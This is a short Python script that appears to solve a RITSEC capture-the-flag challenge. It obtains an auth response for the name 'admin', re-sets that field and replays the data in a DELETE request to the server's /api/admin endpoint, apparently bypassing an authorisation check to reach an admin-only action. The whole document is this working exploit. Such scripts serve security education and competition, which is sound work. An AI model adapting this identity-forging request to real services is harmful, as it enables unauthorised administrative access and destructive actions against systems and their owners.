import requests

url = "http://ctfchallenges.ritsec.club:3000"

s = requests.Session()

res = s.get(url + "/auth", params={'name':'admin'})
data = res.json()
data['name'] = 'admin'

res = s.delete(url + "/api/admin", params=data)
print(res.text)